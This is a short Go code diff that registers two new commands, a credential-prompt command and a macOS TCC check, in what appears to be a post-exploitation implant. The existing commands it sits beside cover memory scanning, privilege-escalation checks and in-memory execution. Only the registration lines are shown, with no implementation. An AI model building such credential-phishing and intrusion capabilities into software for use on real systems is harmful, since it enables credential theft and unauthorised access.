@@ -19,4 +19,6 @@ func registerPlatformCommands() {
 	RegisterCommand(&MemScanCommand{})
 	RegisterCommand(&PrivescCheckCommand{})
 	RegisterCommand(&ExecuteMemoryCommand{})
+	RegisterCommand(&CredentialPromptCommand{})
+	RegisterCommand(&TCCCheckCommand{})
 }
